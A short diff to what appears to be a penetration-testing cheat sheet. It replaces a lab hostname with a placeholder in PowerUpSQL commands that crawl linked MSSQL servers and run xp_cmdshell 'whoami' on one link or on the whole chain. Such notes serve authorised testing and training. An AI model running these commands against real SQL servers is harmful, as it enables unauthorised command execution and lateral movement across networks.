@@ -67,7 +67,7 @@ C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> -Verbose
 ---
 ```powershell
 # On Specific Instance
-C:> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <sq_host>
+C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <sq_host>
 
 # Execute query on every link of the chain
 C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> -Query "exec master..xp_cmdshell 'whoami'" 
